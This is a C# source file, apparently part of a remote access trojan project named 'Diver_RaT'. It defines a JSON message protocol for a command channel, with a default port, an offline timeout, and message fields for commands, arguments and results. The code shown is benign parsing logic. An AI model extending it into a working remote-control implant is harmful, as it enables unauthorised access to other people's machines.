using System.Collections.Generic;
using System.Text.Json;

namespace Diver_RaT
{
    public static class Protocol
    {
        public const int DefaultPort = 5050;
        public const int OfflineAfterSeconds = 90;

        public static string Serialize(object message) => JsonSerializer.Serialize(message);

        public static NetMessage? TryParse(string line)
        {
            try
            {
                var doc = JsonDocument.Parse(line);
                if (!doc.RootElement.TryGetProperty("type", out var t)) return null;

                var msg = new NetMessage { Type = t.GetString() ?? string.Empty };

                if (doc.RootElement.TryGetProperty("requestId", out var rid))
                    msg.RequestId = rid.GetString();

                if (doc.RootElement.TryGetProperty("command", out var cmd))
                    msg.Command = cmd.GetString();

                if (doc.RootElement.TryGetProperty("success", out var ok))
                    msg.Success = ok.GetBoolean();

                if (doc.RootElement.TryGetProperty("data", out var data))
                {
                    if (data.ValueKind == JsonValueKind.Object)
                    {
                        msg.Data = new Dictionary<string, string>();
                        foreach (var prop in data.EnumerateObject())
                            msg.Data[prop.Name] = prop.Value.ValueKind == JsonValueKind.String
                                ? prop.Value.GetString() ?? string.Empty
                                : prop.Value.GetRawText();
                    }
                    else
                    {
                        msg.Result = data.GetString();
                    }
                }

                if (doc.RootElement.TryGetProperty("args", out var args) && args.ValueKind == JsonValueKind.Object)
                {
                    msg.Args = new Dictionary<string, string>();
                    foreach (var prop in args.EnumerateObject())
                        msg.Args[prop.Name] = prop.Value.ValueKind == JsonValueKind.String
                            ? prop.Value.GetString() ?? string.Empty
                            : prop.Value.GetRawText();
                }

                return msg;
            }
            catch
            {
                return null;
            }
        }
    }

    public class NetMessage
    {
        public string Type { get; set; } = string.Empty;
        public string? RequestId { get; set; }
        public string? Command { get; set; }
        public bool? Success { get; set; }
        public Dictionary<string, string>? Data { get; set; }
        public Dictionary<string, string>? Args { get; set; }
        public string? Result { get; set; }
    }
}
